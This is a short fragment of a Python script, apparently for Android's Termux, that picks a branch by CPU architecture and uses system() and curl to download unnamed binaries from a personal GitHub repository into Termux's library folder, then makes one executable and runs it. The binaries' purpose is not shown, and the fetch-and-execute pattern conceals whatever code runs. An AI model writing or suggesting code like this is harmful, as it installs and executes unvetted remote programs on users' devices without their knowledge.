...
if machine()=='aarch64':
    ...
    system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/xd -o xd && mv xd /data/data/com.termux/files/usr/lib')
    system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/rnd -o rnd && mv rnd /data/data/com.termux/files/usr/lib')
    system('curl -L https://github.com/REFAT-156/MFILE/blob/main/dump?raw=true -o dump && mv dump /data/data/com.termux/files/usr/lib')
    system('chmod +x /data/data/com.termux/files/usr/lib/xd;cd /data/data/com.termux/files/usr/lib;./xd')
else:
    ...
    system('curl -L https://github.com/REFAT-156/MFILE/blob/main/dump32?raw=true -o dump && mv dump /data/data/com.termux/files/usr/lib')
    system('chmod +x /data/data/com.termux/files/usr/lib/xd;cd /data/data/com.termux/files/usr/lib;./xd')
